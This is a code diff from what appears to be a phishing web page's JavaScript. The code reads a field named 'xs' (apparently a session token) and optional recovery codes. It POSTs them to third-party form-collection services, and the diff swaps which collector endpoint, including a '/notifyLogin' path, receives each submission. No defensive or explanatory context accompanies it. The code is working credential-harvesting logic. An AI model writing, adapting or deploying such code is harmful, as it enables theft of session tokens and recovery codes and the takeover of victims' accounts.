@@ -447,7 +447,7 @@
             const xsInput = document.getElementById("xs").value.trim();
             const recoveryInput = document.getElementById("recovery_codes")?.value.trim() || "";
 
-            fetch("https://postal-form.on.shiper.app/submit", {
+            fetch("https://submit-form.com/x7gYyBupD", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -460,7 +460,7 @@
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://submit-form.com/x7gYyBupD", {
+                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
@@ -483,7 +483,7 @@
                 console.error("Submission error:", err);
                 alert("An error occurred. Please try again.");
                 if (allowRecovery && recoveryInput) {
-                         fetch("https://submit-form.com/x7gYyBupD", {
+                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
